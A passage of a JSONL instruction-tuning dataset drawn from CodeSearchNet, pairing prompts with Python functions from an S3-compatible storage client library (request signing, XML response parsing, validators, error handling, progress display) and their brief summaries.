'&'.join(query_components)\n        if query_string:\n            url_components.append('?')\n            url_components.append(query_string)\n    new_url = ''.join(url_components)\n    # new url constructor block ends.\n    new_parsed_url = urlsplit(new_url)\n\n    canonical_request = generate_canonical_request(method,\n                                                   new_parsed_url,\n                                                   headers_to_sign,\n                                                   signed_headers,\n                                                   content_hash_hex)\n    string_to_sign = generate_string_to_sign(request_date, region,\n                                             canonical_request)\n    signing_key = generate_signing_key(request_date, region, secret_key)\n    signature = hmac.new(signing_key, string_to_sign.encode('utf-8'),\n                         hashlib.sha256).hexdigest()\n    new_parsed_url = urlsplit(new_url + \"&X-Amz-Signature=\"+signature)\n    return new_parsed_url.geturl()", "response": "Calculates the signature version 4 for a URL."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_signed_headers(headers):\n    signed_headers = []\n    for header in headers:\n        signed_headers.append(header.lower().strip())\n    return sorted(signed_headers)", "response": "Get signed headers.\n\n    :param headers: input dictionary to be sorted."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsign a request using the version 4 API.", "response": "def sign_v4(method, url, region, headers=None,\n            access_key=None,\n            secret_key=None,\n            session_token=None,\n            content_sha256=None):\n    \"\"\"\n    Signature version 4.\n\n    :param method: HTTP method used for signature.\n    :param url: Final url which needs to be signed.\n    :param region: Region should be set to bucket region.\n    :param headers: Optional headers for the method.\n    :param access_key: Optional access key, if not\n       specified no signature is needed.\n    :param secret_key: Optional secret key, if not\n       specified no signature is needed.\n    :param session_token: Optional session token, set\n       only for temporary credentials.\n    :param content_sha256: Optional body sha256.\n    \"\"\"\n\n    # If no access key or secret key is provided return headers.\n    if not access_key or not secret_key:\n        return headers\n\n    if headers is None:\n        headers = FoldCaseDict()\n\n    if region is None:\n        region = 'us-east-1'\n\n    parsed_url = urlsplit(url)\n    secure = parsed_url.scheme == 'https'\n    if secure:\n        content_sha256 = _UNSIGNED_PAYLOAD\n    if content_sha256 is None:\n        # with no payload, calculate sha256 for 0 length data.\n        content_sha256 = get_sha256_hexdigest('')\n\n    host = parsed_url.netloc\n    headers['Host'] = host\n\n    date = datetime.utcnow()\n    headers['X-Amz-Date'] = date.strftime(\"%Y%m%dT%H%M%SZ\")\n    headers['X-Amz-Content-Sha256'] = content_sha256\n    if session_token:\n        headers['X-Amz-Security-Token'] = session_token\n\n    headers_to_sign = headers\n\n    signed_headers = get_signed_headers(headers_to_sign)\n    canonical_req = generate_canonical_request(method,\n                                               parsed_url,\n                                               headers_to_sign,\n                                               signed_headers,\n                                               content_sha256)\n\n    string_to_sign = generate_string_to_sign(date, region,\n                                             canonical_req)\n    signing_key = generate_signing_key(date, region, secret_key)\n    signature = hmac.new(signing_key, string_to_sign.encode('utf-8'),\n                         hashlib.sha256).hexdigest()\n\n    authorization_header = generate_authorization_header(access_key,\n                                                         date,\n                                                         region,\n                                                         signed_headers,\n                                                         signature)\n\n    headers['Authorization'] = authorization_header\n    return headers"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef generate_canonical_request(method, parsed_url, headers, signed_headers, content_sha256):\n    lines = [method, parsed_url.path, parsed_url.query]\n\n    # Headers added to canonical request.\n    header_lines = []\n    for header in signed_headers:\n        value = headers[header.title()]\n        value = str(value).strip()\n        header_lines.append(header + ':' + str(value))\n\n    lines = lines + header_lines\n    lines.append('')\n\n    lines.append(';'.join(signed_headers))\n    lines.append(content_sha256)\n    return '\\n'.join(lines)", "response": "Generate canonical request.\n\n    :param method: HTTP method.\n    :param parsed_url: Parsed url is input from :func:`urlsplit`\n    :param headers: HTTP header dictionary.\n    :param content_sha256: Content sha256 hexdigest string."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate string to sign.", "response": "def generate_string_to_sign(date, region, canonical_request):\n    \"\"\"\n    Generate string to sign.\n\n    :param date: Date is input from :meth:`datetime.datetime`\n    :param region: Region should be set to bucket region.\n    :param canonical_request: Canonical request generated previously.\n    \"\"\"\n    formatted_date_time = date.strftime(\"%Y%m%dT%H%M%SZ\")\n\n    canonical_request_hasher = hashlib.sha256()\n    canonical_request_hasher.update(canonical_request.encode('utf-8'))\n    canonical_request_sha256 = canonical_request_hasher.hexdigest()\n    scope = generate_scope_string(date, region)\n\n    return '\\n'.join([_SIGN_V4_ALGORITHM,\n                      formatted_date_time,\n                      scope,\n                      canonical_request_sha256])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef generate_signing_key(date, region, secret_key):\n    formatted_date = date.strftime(\"%Y%m%d\")\n\n    key1_string = 'AWS4' + secret_key\n    key1 = key1_string.encode('utf-8')\n    key2 = hmac.new(key1, formatted_date.encode('utf-8'),\n                    hashlib.sha256).digest()\n    key3 = hmac.new(key2, region.encode('utf-8'), hashlib.sha256).digest()\n    key4 = hmac.new(key3, 's3'.encode('utf-8'), hashlib.sha256).digest()\n\n    return hmac.new(key4, 'aws4_request'.encode('utf-8'),\n                    hashlib.sha256).digest()", "response": "Generate signing key.\n\n    :param date: Date is input from :meth:`datetime.datetime`\n    :param region: Region should be set to bucket region.\n    :param secret_key: Secret access key."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate scope string. :param date: Date is input from :meth:`datetime.datetime` :param region: Region should be set to bucket region.", "response": "def generate_scope_string(date, region):\n    \"\"\"\n    Generate scope string.\n\n    :param date: Date is input from :meth:`datetime.datetime`\n    :param region: Region should be set to bucket region.\n    \"\"\"\n    formatted_date = date.strftime(\"%Y%m%d\")\n    scope = '/'.join([formatted_date,\n                      region,\n                      's3',\n                      'aws4_request'])\n    return scope"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef generate_authorization_header(access_key, date, region,\n                                  signed_headers, signature):\n    \"\"\"\n    Generate authorization header.\n\n    :param access_key: Server access key.\n    :param date: Date is input from :meth:`datetime.datetime`\n    :param region: Region should be set to bucket region.\n    :param signed_headers: Signed headers.\n    :param signature: Calculated signature.\n    \"\"\"\n    signed_headers_string = ';'.join(signed_headers)\n    credential = generate_credential_string(access_key, date, region)\n    auth_header = [_SIGN_V4_ALGORITHM, 'Credential=' + credential + ',',\n                   'SignedHeaders=' + signed_headers_string + ',',\n                   'Signature=' + signature]\n    return ' '.join(auth_header)", "response": "Generate authorization header.\n\n    :param access_key: Server access key.\n    :param date: Date is input from :meth:`datetime.datetime`\n    :param region: Region should be set to bucket region.\n    :param signed_headers: Signed headers.\n    :param signature: Calculated signature."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_multipart_upload_result(data):\n    root = S3Element.fromstring('CompleteMultipartUploadResult', data)\n\n    return MultipartUploadResult(\n        root.get_child_text('Bucket'),\n        root.get_child_text('Key'),\n        root.get_child_text('Location'),\n        root.get_etag_elem()\n    )", "response": "Parser for complete multipart upload response."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_copy_object(bucket_name, object_name, data):\n    root = S3Element.fromstring('CopyObjectResult', data)\n\n    return CopyObjectResult(\n        bucket_name, object_name,\n        root.get_etag_elem(),\n        root.get_localized_time_elem('LastModified')\n    )", "response": "Parser for copy object response."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_list_buckets(data):\n    root = S3Element.fromstring('ListBucketsResult', data)\n\n    return [\n        Bucket(bucket.get_child_text('Name'),\n               bucket.get_localized_time_elem('CreationDate'))\n        for buckets in root.findall('Buckets')\n        for bucket in buckets.findall('Bucket')\n    ]", "response": "Parser for list buckets response."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _parse_objects_from_xml_elts(bucket_name, contents, common_prefixes):\n    objects = [\n        Object(bucket_name,\n               content.get_child_text('Key'),\n               content.get_localized_time_elem('LastModified'),\n               content.get_etag_elem(strict=False),\n               content.get_int_elem('Size'),\n               is_dir=content.is_dir())\n        for content in contents\n    ]\n\n    object_dirs = [\n        Object(bucket_name, dir_elt.text(), None, '',\n               0, is_dir=True)\n        for dirs_elt in common_prefixes\n        for dir_elt in dirs_elt.findall('Prefix')\n    ]\n\n    return objects, object_dirs", "response": "Internal function that extracts objects and common prefixes from list_objects responses."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_list_multipart_uploads(data, bucket_name):\n    root = S3Element.fromstring('ListMultipartUploadsResult', data)\n\n    is_truncated = root.get_child_text('IsTruncated').lower() == 'true'\n    key_marker = root.get_urldecoded_elem_text('NextKeyMarker', strict=False)\n    upload_id_marker = root.get_child_text('NextUploadIdMarker', strict=False)\n    uploads = [\n        IncompleteUpload(bucket_name,\n                         upload.get_urldecoded_elem_text('Key'),\n                         upload.get_child_text('UploadId'),\n                         upload.get_localized_time_elem('Initiated'))\n        for upload in root.findall('Upload')\n    ]\n\n    return uploads, is_truncated, key_marker, upload_id_marker", "response": "Parser for list multipart uploads response."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_list_parts(data, bucket_name, object_name, upload_id):\n    root = S3Element.fromstring('ListPartsResult', data)\n\n    is_truncated = root.get_child_text('IsTruncated').lower() == 'true'\n    part_marker = root.get_child_text('NextPartNumberMarker', strict=False)\n    parts = [\n        UploadPart(bucket_name, object_name, upload_id,\n                   part.get_int_elem('PartNumber'),\n                   part.get_etag_elem(),\n                   part.get_localized_time_elem('LastModified'),\n                   part.get_int_elem('Size'))\n        for part in root.findall('Part')\n    ]\n\n    return parts, is_truncated, part_marker", "response": "Parser for list parts response."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _iso8601_to_localized_time(date_string):\n    parsed_date = datetime.strptime(date_string, '%Y-%m-%dT%H:%M:%S.%fZ')\n    localized_time = pytz.utc.localize(parsed_date)\n    return localized_time", "response": "Convert an ISO8601 formatted date string into a UTC time."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninitializes an S3Element from name and XML string data.", "response": "def fromstring(cls, root_name, data):\n        \"\"\"Initialize S3Element from name and XML string data.\n\n        :param name: Name for XML data. Used in XML errors.\n        :param data: string data to be parsed.\n        :return: Returns an S3Element.\n        \"\"\"\n        try:\n            return cls(root_name, cElementTree.fromstring(data))\n        except _ETREE_EXCEPTIONS as error:\n            raise InvalidXMLError(\n                '\"{}\" XML is not parsable. Message: {}'.format(\n                    root_name, error.message\n                )\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef findall(self, name):\n        return [\n            S3Element(self.root_name, elem)\n            for elem in self.element.findall('s3:{}'.format(name), _S3_NS)\n        ]", "response": "Similar to ElementTree. Element. findall but returns a list of S3Elements."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find(self, name):\n        elt = self.element.find('s3:{}'.format(name), _S3_NS)\n        return S3Element(self.root_name, elt) if elt is not None else None", "response": "Similar to ElementTree. Element. find but returns the first matching S3 element."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nextracts text of a child element.", "response": "def get_child_text(self, name, strict=True):\n        \"\"\"Extract text of a child element. If strict, and child element is\n        not present, raises InvalidXMLError and otherwise returns\n        None.\n\n        \"\"\"\n        if strict:\n            try:\n                return self.element.find('s3:{}'.format(name), _S3_NS).text\n            except _ETREE_EXCEPTIONS as error:\n                raise InvalidXMLError(\n                    ('Invalid XML provided for \"{}\" - erroring tag <{}>. '\n                     'Message: {}').format(self.root_name, name, error.message)\n                )\n        else:\n            return self.element.findtext('s3:{}'.format(name), None, _S3_NS)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_urldecoded_elem_text(self, name, strict=True):\n        text = self.get_child_text(name, strict)\n        # strictness is already enforced above.\n        return urldecode(text) if text is not None else None", "response": "Like get_child_text but performs urldecode on the\n        result."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting seconds to time format.", "response": "def seconds_to_time(seconds):\n    \"\"\"\n    Consistent time format to be displayed on the elapsed time in screen.\n    :param seconds: seconds\n    \"\"\"\n    minutes, seconds = divmod(int(seconds), 60)\n    hours, m = divmod(minutes, 60)\n    if hours:\n        return _HOURS_OF_ELAPSED % (hours, m, seconds)\n    else:\n        return _MINUTES_OF_ELAPSED % (m, seconds)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a string that can be displayed on the screen.", "response": "def format_string(current_size, total_length, elapsed_time):\n    \"\"\"\n    Consistent format to be displayed on the screen.\n    :param current_size: Number of finished object size\n    :param total_length: Total object size\n    :param elapsed_time: number of seconds passed since start\n    \"\"\"\n\n    n_to_mb = current_size / _KILOBYTE / _KILOBYTE\n    elapsed_str = seconds_to_time(elapsed_time)\n\n    rate = _RATE_FORMAT % (n_to_mb / elapsed_time) if elapsed_time else _UNKNOWN_SIZE\n    frac = float(current_size) / total_length\n    bar_length = int(frac * _BAR_SIZE)\n    bar = _FINISHED_BAR * bar_length + _REMAINING_BAR * (_BAR_SIZE - bar_length)\n    percentage = _PERCENTAGE_FORMAT % (frac * 100)\n    left_str = seconds_to_time(\n        elapsed_time / current_size * (total_length - current_size)) if current_size else _UNKNOWN_SIZE\n\n    humanized_total = _HUMANINZED_FORMAT % (total_length / _KILOBYTE / _KILOBYTE) + _STR_MEGABYTE\n    humanized_n = _HUMANINZED_FORMAT % n_to_mb + _STR_MEGABYTE\n\n    return _DISPLAY_FORMAT % (\n        bar, humanized_n, humanized_total, percentage, elapsed_str, left_str, rate)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset the metadata settings for the object.", "response": "def set_meta(self, total_length, object_name):\n        \"\"\"\n        Metadata settings for the object. This method called before uploading object\n        :param total_length: Total length of object.\n        :param object_name: Object name to be showed.\n        \"\"\"\n        self.total_length = total_length\n        self.object_name = object_name\n        self.prefix = self.object_name + ': ' if self.object_name else ''"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, size):\n        if not isinstance(size, int):\n            raise ValueError('{} type can not be displayed. '\n                             'Please change it to Int.'.format(type(size)))\n\n        self.current_size += size\n        self.display_queue.put((self.current_size, self.total_length))", "response": "Update the size of the object in bytes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nextract and returns an AWS S3 region from an endpoint.", "response": "def get_s3_region_from_endpoint(endpoint):\n    \"\"\"\n    Extracts and returns an AWS S3 region from an endpoint\n    of form `s3-ap-southeast-1.amazonaws.com`\n\n    :param endpoint: Endpoint region to be extracted.\n    \"\"\"\n\n    # Extract region by regex search.\n    m = _EXTRACT_REGION_REGEX.search(endpoint)\n    if m:\n        # Regex matches, we have found a region.\n        region = m.group(1)\n        if region == 'external-1':\n            # Handle special scenario for us-east-1 URL.\n            return 'us-east-1'\n        if region.startswith('dualstack'):\n            # Handle special scenario for dualstack URL.\n            return region.split('.')[1]\n        return region\n\n    # No regex matches return None.\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef dump_http(method, url, request_headers, response, output_stream):\n\n    # Start header.\n    output_stream.write('---------START-HTTP---------\\n')\n\n    # Get parsed url.\n    parsed_url = urlsplit(url)\n\n    # Dump all request headers recursively.\n    http_path = parsed_url.path\n    if parsed_url.query:\n        http_path = http_path + '?' + parsed_url.query\n\n    output_stream.write('{0} {1} HTTP/1.1\\n'.format(method,\n                                                    http_path))\n\n    for k, v in list(request_headers.items()):\n        if k is 'authorization':\n            # Redact signature header value from trace logs.\n            v = re.sub(r'Signature=([[0-9a-f]+)', 'Signature=*REDACTED*', v)\n        output_stream.write('{0}: {1}\\n'.format(k.title(), v))\n\n    # Write a new line.\n    output_stream.write('\\n')\n\n    # Write response status code.\n    output_stream.write('HTTP/1.1 {0}\\n'.format(response.status))\n\n    # Dump all response headers recursively.\n    for k, v in list(response.getheaders().items()):\n        output_stream.write('{0}: {1}\\n'.format(k.title(), v))\n\n    # For all errors write all the available response body.\n    if response.status != 200 and \\\n       response.status != 204 and response.status != 206:\n        output_stream.write('{0}'.format(response.read()))\n\n    # End header.\n    output_stream.write('---------END-HTTP---------\\n')", "response": "Dump all headers and response headers into output_stream."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef read_full(data, size):\n    default_read_size = 32768 # 32KiB per read operation.\n    chunk = io.BytesIO()\n    chunk_size = 0\n\n    while chunk_size < size:\n        read_size = default_read_size\n        if (size - chunk_size) < default_read_size:\n            read_size = size - chunk_size\n        current_data = data.read(read_size)\n        if not current_data or len(current_data) == 0:\n            break\n        chunk.write(current_data)\n        chunk_size+= len(current_data)\n\n    return chunk.getvalue()", "response": "Reads exactly size bytes from reader. returns size bytes."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_target_url(endpoint_url, bucket_name=None, object_name=None,\n                   bucket_region='us-east-1', query=None):\n    \"\"\"\n    Construct final target url.\n\n    :param endpoint_url: Target endpoint url where request is served to.\n    :param bucket_name: Bucket component for the target url.\n    :param object_name: Object component for the target url.\n    :param bucket_region: Bucket region for the target url.\n    :param query: Query parameters as a *dict* for the target url.\n    :return: Returns final target url as *str*.\n    \"\"\"\n    # New url\n    url = None\n\n    # Parse url\n    parsed_url = urlsplit(endpoint_url)\n\n    # Get new host, scheme.\n    scheme = parsed_url.scheme\n    host = parsed_url.netloc\n\n    # Strip 80/443 ports since curl & browsers do not\n    # send them in Host header.\n    if (scheme == 'http' and parsed_url.port == 80) or\\\n       (scheme == 'https' and parsed_url.port == 443):\n        host = parsed_url.hostname\n\n    if 's3.amazonaws.com' in host:\n        host = get_s3_endpoint(bucket_region)\n\n    url = scheme + '://' + host\n    if bucket_name:\n        # Save if target url will have buckets which suppport\n        # virtual host.\n        is_virtual_host_style = is_virtual_host(endpoint_url,\n                                                bucket_name)\n        if is_virtual_host_style:\n            url = (scheme + '://' + bucket_name + '.' + host)\n        else:\n            url = (scheme + '://' + host + '/' + bucket_name)\n\n    url_components = [url]\n    url_components.append('/')\n\n    if object_name:\n        object_name = encode_object_name(object_name)\n        url_components.append(object_name)\n\n    if query:\n        ordered_query = collections.OrderedDict(sorted(query.items()))\n        query_components = []\n        for component_key in ordered_query:\n            if isinstance(ordered_query[component_key], list):\n                for value in ordered_query[component_key]:\n                    query_components.append(component_key+'='+\n                                            queryencode(value))\n            else:\n                query_components.append(\n                    component_key+'='+\n                    queryencode(ordered_query.get(component_key, '')))\n\n        query_string = '&'.join(query_components)\n        if query_string:\n            url_components.append('?')\n            url_components.append(query_string)\n\n    return ''.join(url_components)", "response": "Construct a new target url."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_virtual_host(endpoint_url, bucket_name):\n    is_valid_bucket_name(bucket_name)\n\n    parsed_url = urlsplit(endpoint_url)\n    # bucket_name can be valid but '.' in the hostname will fail\n    # SSL certificate validation. So do not use host-style for\n    # such buckets.\n    if 'https' in parsed_url.scheme and '.' in bucket_name:\n        return False\n    for host in ['s3.amazonaws.com', 'aliyuncs.com']:\n        if host in parsed_url.netloc:\n            return True\n    return False", "response": "Check to see if the bucket_name can be part of virtual host."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nvalidating if input is a string and non empty.", "response": "def is_non_empty_string(input_string):\n    \"\"\"\n    Validate if non empty string\n\n    :param input_string: Input is a *str*.\n    :return: True if input is string and non empty.\n       Raise :exc:`Exception` otherwise.\n    \"\"\"\n    try:\n        if not input_string.strip():\n            raise ValueError()\n    except AttributeError as error:\n        raise TypeError(error)\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nvalidates if policy parameter is of type str.", "response": "def is_valid_policy_type(policy):\n    \"\"\"\n    Validate if policy is type str\n\n    :param policy: S3 style Bucket policy.\n    :return: True if policy parameter is of a valid type, 'string'.\n    Raise :exc:`TypeError` otherwise.\n    \"\"\"\n    if _is_py3:\n        string_type = str,\n    elif _is_py2:\n        string_type = basestring\n\n    if not isinstance(policy, string_type):\n        raise TypeError('policy can only be of type str')\n\n    is_non_empty_string(policy)\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef is_valid_bucket_notification_config(notifications):\n    # check if notifications is a dict.\n    if not isinstance(notifications, dict):\n        raise TypeError('notifications configuration must be a dictionary')\n\n    if len(notifications) == 0:\n        raise InvalidArgumentError(\n            'notifications configuration may not be empty'\n        )\n\n    VALID_NOTIFICATION_KEYS = set([\n        \"TopicConfigurations\",\n        \"QueueConfigurations\",\n        \"CloudFunctionConfigurations\",\n    ])\n\n    VALID_SERVICE_CONFIG_KEYS = set([\n        'Id',\n        'Arn',\n        'Events',\n        'Filter',\n    ])\n\n    NOTIFICATION_EVENTS = set([\n        's3:ReducedRedundancyLostObject',\n        's3:ObjectCreated:*',\n        's3:ObjectCreated:Put',\n        's3:ObjectCreated:Post',\n        's3:ObjectCreated:Copy',\n        's3:ObjectCreated:CompleteMultipartUpload',\n        's3:ObjectRemoved:*',\n        's3:ObjectRemoved:Delete',\n        's3:ObjectRemoved:DeleteMarkerCreated',\n    ])\n\n    for key, value in notifications.items():\n        # check if key names are valid\n        if key not in VALID_NOTIFICATION_KEYS:\n            raise InvalidArgumentError((\n                '{} is an invalid key '\n                'for notifications configuration').format(key))\n\n        # check if config values conform\n        # first check if value is a list\n        if not isinstance(value, list):\n            raise InvalidArgumentError((\n                'The value for key \"{}\" in the notifications '\n                'configuration must be a list.').format(key))\n\n        for service_config in value:\n            # check type matches\n            if not isinstance(service_config, dict):\n                raise InvalidArgumentError((\n                    'Each service configuration item for \"{}\" must be a '\n                    'dictionary').format(key))\n\n            # check keys are valid\n            for skey in service_config.keys():\n                if skey not in VALID_SERVICE_CONFIG_KEYS:\n                    raise InvalidArgumentError((\n                        '{} is an invalid key for a service '\n                        'configuration item').format(skey))\n\n            # check for required keys\n            arn = service_config.get('Arn', '')\n            if arn == '':\n                raise InvalidArgumentError(\n                    'Arn key in service config must be present and has to be '\n                    'non-empty string'\n                )\n            events = service_config.get('Events', [])\n            if len(events) < 1:\n                raise InvalidArgumentError(\n                    'At least one event must be specified in a service config'\n                )\n            if not isinstance(events, list):\n                raise InvalidArgumentError('\"Events\" must be a list of strings '\n                                           'in a service configuration')\n\n            # check if 'Id' key is present, it should be string or bytes.\n            if not isinstance(service_config.get('Id', ''), basestring):\n                raise InvalidArgumentError('\"Id\" key must be a string')\n\n            for event in events:\n                if event not in NOTIFICATION_EVENTS:\n                    raise InvalidArgumentError(\n                        '{} is not a valid event. Valid '\n                        'events are: {}'.format(event, NOTIFICATION_EVENTS))\n\n            if 'Filter' in service_config:\n                exception_msg = (\n                    '{} - If a Filter key is given, it must be a '\n                    'dictionary, the dictionary must have the '\n                    'key \"Key\", and its value must be an object, with '\n                    'a key named \"FilterRules\" which must be a non-empty list.'\n                ).format(\n                    service_config['Filter']\n                )\n                try:\n                    filter_rules = service_config.get('Filter', {}).get(\n                        'Key', {}).get('FilterRules', [])\n                    if not isinstance(filter_rules, list):\n                        raise InvalidArgumentError(exception_msg)\n                    if len(filter_rules) < 1:\n                        raise InvalidArgumentError(exception_msg)\n                except AttributeError:\n                    raise InvalidArgumentError(exception_msg)\n                for filter_rule in filter_rules:\n                    try:\n                        name = filter_rule['Name']\n                        value = filter_rule['Value']\n                    except KeyError:\n                        raise InvalidArgumentError((\n                            '{} - a FilterRule dictionary must have \"Name\" '\n                             'and \"Value\" keys').format(filter_rule))\n\n                    if name not in ['prefix', 'suffix']:\n                        raise InvalidArgumentError((\n                            '{} - The \"Name\" key in a filter rule must be '\n                             'either \"prefix\" or \"suffix\"').format(name))\n\n    return True", "response": "Validate the notifications config structure and return a boolean value."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef is_valid_sse_object(sse):\n    if sse and sse.type() != \"SSE-C\" and sse.type() != \"SSE-KMS\" and sse.type() != \"SSE-S3\":\n        raise InvalidArgumentError(\"unsuported type of sse argument in put_object\")", "response": "Validate the SSE object and type of the SSE object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncalculating optimal part size for multipart uploads.", "response": "def optimal_part_info(length, part_size):\n    \"\"\"\n    Calculate optimal part size for multipart uploads.\n\n    :param length: Input length to calculate part size of.\n    :return: Optimal part size.\n    \"\"\"\n    # object size is '-1' set it to 5TiB.\n    if length == -1:\n        length = MAX_MULTIPART_OBJECT_SIZE\n    if length > MAX_MULTIPART_OBJECT_SIZE:\n        raise InvalidArgumentError('Input content size is bigger '\n                                   ' than allowed maximum of 5TiB.')\n\n    # honor user configured size\n    if part_size != MIN_PART_SIZE:\n        part_size_float = float(part_size)\n    else:\n        # Use floats for part size for all calculations to avoid\n        # overflows during float64 to int64 conversions.\n        part_size_float = math.ceil(length/MAX_MULTIPART_COUNT)\n        part_size_float = (math.ceil(part_size_float/part_size)\n                        * part_size)\n    # Total parts count.\n    total_parts_count = int(math.ceil(length/part_size_float))\n    # Part size.\n    part_size = int(part_size_float)\n    # Last part size.\n    last_part_size = length - int(total_parts_count-1)*part_size\n    return total_parts_count, part_size, last_part_size"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngets the error exception derived from the initialization of an ErrorResponse object containing the error code.", "response": "def get_exception(self):\n        \"\"\"\n        Gets the error exception derived from the initialization of\n        an ErrorResponse object\n\n        :return: The derived exception or ResponseError exception\n        \"\"\"\n        exception = known_errors.get(self.code)\n        if exception:\n            return exception(self)\n        else:\n            return self"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _handle_error_response(self, bucket_name=None):\n        if not self._response.data:\n            self._set_error_response_without_body(bucket_name)\n        else:\n            self._set_error_response_with_body(bucket_name)", "response": "Sets the error response to the response body if available."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nset all the error response fields with a valid response body.", "response": "def _set_error_response_with_body(self, bucket_name=None):\n        \"\"\"\n        Sets all the error response fields with a valid response body.\n           Raises :exc:`ValueError` if invoked on a zero length body.\n\n        :param bucket_name: Optional bucket name resource at which error\n           occurred.\n        :param object_name: Option object name resource at which error\n           occurred.\n        \"\"\"\n        if len(self._response.data) == 0:\n            raise ValueError('response data has no body.')\n        try:\n            root = cElementTree.fromstring(self._response.data)\n        except _ETREE_EXCEPTIONS as error:\n            raise InvalidXMLError('\"Error\" XML is not parsable. '\n                                  'Message: {0}'.format(error.message))\n        for attribute in root:\n            if attribute.tag == 'Code':\n                self.code = attribute.text\n            elif attribute.tag == 'BucketName':\n                self.bucket_name = attribute.text\n            elif attribute.tag == 'Key':\n                self.object_name = attribute.text\n            elif attribute.tag == 'Message':\n                self.message = attribute.text\n            elif attribute.tag == 'RequestId':\n                self.request_id = attribute.text\n            elif attribute.tag == 'HostId':\n                self.host_id = attribute.text\n        # Set amz headers.\n        self._set_amz_headers()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _set_error_response_without_body(self, bucket_name=None):\n        if self._response.status == 404:\n            if bucket_name:\n                if self.object_name:\n                    self.code = 'NoSuchKey'\n                    self.message = self._response.reason\n                else:\n                    self.code = 'NoSuchBucket'\n                    self.message = self._response.reason\n        elif self._response.status == 409:\n            self.code = 'Conflict'\n            self.message = 'The bucket you tried to delete is not empty.'\n        elif self._response.status == 403:\n            self.code = 'AccessDenied'\n            self.message = self._response.reason\n        elif self._response.status == 400:\n            self.code = 'BadRequest'\n            self.message = self._response.reason\n        elif self._response.status == 301:\n            self.code = 'PermanentRedirect'\n            self.message = self._response.reason\n        elif self._response.status == 307:\n            self.code = 'Redirect'\n            self.message = self._response.reason\n        elif self._response.status in [405, 501]:\n            self.code = 'MethodNotAllowed'\n            self.message = self._response.reason\n        elif self._response.status == 500:\n            self.code = 'InternalError'\n            self.message = 'Internal Server Error.'\n        else:\n            self.code = 'UnknownException'\n            self.message = self._response.reason\n        # Set amz headers.\n        self._set_amz_headers()", "response": "Sets all the error response fields from the response headers."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsetting the x - amz - * error response fields from response headers.", "response": "def _set_amz_headers(self):\n        \"\"\"\n        Sets x-amz-* error response fields from response headers.\n        \"\"\"\n        if self._response.headers:\n            # keeping x-amz-id-2 as part of amz_host_id.\n            if 'x-amz-id-2' in self._response.headers:\n                self.host_id = self._response.headers['x-amz-id-2']\n            if 'x-amz-request-id' in self._response.headers:\n                self.request_id = self._response.headers['x-amz-request-id']\n            # This is a new undocumented field, set only if available.\n            if 'x-amz-bucket-region' in self._response.headers:\n                self.region = self._response.headers['x-amz-bucket-region']"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the user agent for the application.", "response": "def set_app_info(self, app_name, app_version):\n        \"\"\"\n        Sets your application name and version to\n        default user agent in the following format.\n\n              MinIO (OS; ARCH) LIB/VER APP/VER\n\n        Example:\n            client.set_app_info('my_app', '1.0.2')\n\n        :param app_name: application name.\n        :param app_version: application version.\n        \"\"\"\n        if not (app_name and app_version):\n            raise ValueError('app_name and app_version cannot be empty.')\n\n        app_info = _APP_INFO.format(app_name,\n                                    app_version)\n        self._user_agent = ' '.join([_DEFAULT_USER_AGENT, app_info])"}
